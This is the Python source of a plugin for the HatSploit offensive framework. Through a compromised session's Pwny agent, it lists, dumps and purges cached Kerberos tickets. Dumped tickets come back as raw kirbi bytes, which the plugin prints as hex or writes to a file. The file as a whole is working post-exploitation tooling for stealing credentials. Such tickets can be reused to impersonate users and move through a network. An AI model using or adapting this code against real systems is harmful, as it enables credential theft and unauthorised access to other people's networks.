"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import datetime

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from pex.proto.tlv import TLVPacket

from hatsploit.lib.core.plugin import Plugin


KERBEROS_LIST = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
KERBEROS_DUMP = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
KERBEROS_PURGE = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

KERBEROS_TYPE_CLIENT = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
KERBEROS_TYPE_SERVER = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
KERBEROS_TYPE_REALM = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
KERBEROS_TYPE_ENCTYPE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)
KERBEROS_TYPE_FLAGS = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)
KERBEROS_TYPE_START = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 2)
KERBEROS_TYPE_END = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 3)
KERBEROS_TYPE_RENEW = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 4)
KERBEROS_TYPE_KIRBI = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)

ETYPE_NAMES = {
    0x01: "DES-CBC-CRC",
    0x03: "DES-CBC-MD5",
    0x11: "AES128-CTS-HMAC-SHA1",
    0x12: "AES256-CTS-HMAC-SHA1",
    0x17: "RC4-HMAC",
    0x18: "RC4-HMAC-EXP",
}

FLAG_NAMES = {
    0x40000000: "forwardable",
    0x20000000: "forwarded",
    0x10000000: "proxiable",
    0x08000000: "proxy",
    0x04000000: "may-postdate",
    0x02000000: "postdated",
    0x01000000: "invalid",
    0x00800000: "renewable",
    0x00400000: "initial",
    0x00200000: "pre-authent",
    0x00100000: "hw-authent",
    0x00010000: "name-canonicalize",
}


def format_etype(etype):
    return ETYPE_NAMES.get(etype, "0x{:x}".format(etype))


def format_flags(flags):
    names = []
    for bit, name in FLAG_NAMES.items():
        if flags & bit:
            names.append(name)
    return ", ".join(names) if names else "none"


def format_time(epoch):
    if epoch == 0:
        return "never"
    try:
        return datetime.datetime.utcfromtimestamp(epoch).strftime(
            "%Y-%m-%d %H:%M:%S UTC"
        )
    except (ValueError, OSError):
        return "invalid"


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Kerberos Plugin",
            'Plugin': "kerberos",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "List, dump, or purge Kerberos tickets from the cache.",
        })

        self.commands = [
            Command({
                'Category': "credential",
                'Name': "kerberos",
                'Description': "List, dump, or purge Kerberos tickets.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-l', '--list'),
                        {
                            'help': "List cached Kerberos tickets.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-d', '--dump'),
                        {
                            'help': "Dump a ticket by server name.",
                            'metavar': 'SERVER',
                        }
                    ),
                    (
                        ('-p', '--purge'),
                        {
                            'help': "Purge all cached tickets.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': "Save dumped ticket to file.",
                            'metavar': 'FILE',
                        }
                    ),
                ]
            })
        ]

    def _list_tickets(self):
        result = self.session.send_command(
            tag=KERBEROS_LIST, plugin=self.plugin
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to list Kerberos tickets!")
            return

        headers = ("Client", "Server", "Realm", "Encryption", "Flags",
                   "Start", "End", "Renew")
        data = []

        entry = result.get_tlv(TLV_TYPE_GROUP)
        while entry:
            client = entry.get_string(KERBEROS_TYPE_CLIENT) or ''
            server = entry.get_string(KERBEROS_TYPE_SERVER) or ''
            realm = entry.get_string(KERBEROS_TYPE_REALM) or ''
            etype = entry.get_int(KERBEROS_TYPE_ENCTYPE) or 0
            flags = entry.get_int(KERBEROS_TYPE_FLAGS) or 0
            start = entry.get_int(KERBEROS_TYPE_START) or 0
            end = entry.get_int(KERBEROS_TYPE_END) or 0
            renew = entry.get_int(KERBEROS_TYPE_RENEW) or 0

            data.append((
                client,
                server,
                realm,
                format_etype(etype),
                format_flags(flags),
                format_time(start),
                format_time(end),
                format_time(renew),
            ))

            entry = result.get_tlv(TLV_TYPE_GROUP)

        if not data:
            self.print_information("No cached tickets found.")
            return

        self.print_table("Kerberos Tickets", headers, *data)

    def _dump_ticket(self, server, outfile):
        result = self.session.send_command(
            tag=KERBEROS_DUMP,
            plugin=self.plugin,
            args={
                KERBEROS_TYPE_SERVER: server,
            },
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to dump ticket for %s!" % server)
            return

        kirbi = result.get_raw(KERBEROS_TYPE_KIRBI)
        if not kirbi:
            self.print_error("No ticket data returned!")
            return

        if outfile:
            with open(outfile, 'wb') as f:
                f.write(kirbi)
            self.print_information("Ticket saved to %s (%d bytes)." % (
                outfile, len(kirbi)))
        else:
            self.print_information("Ticket for %s (%d bytes):" % (
                server, len(kirbi)))
            self.print_information(kirbi.hex())

    def _purge_tickets(self):
        result = self.session.send_command(
            tag=KERBEROS_PURGE, plugin=self.plugin
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to purge ticket cache!")
            return

        self.print_success("Ticket cache purged successfully.")

    def kerberos(self, args):
        if args.list:
            self._list_tickets()
        elif args.dump:
            self._dump_ticket(args.dump, args.output)
        elif args.purge:
            self._purge_tickets()
        else:
            self.print_usage()

    def load(self):
        pass
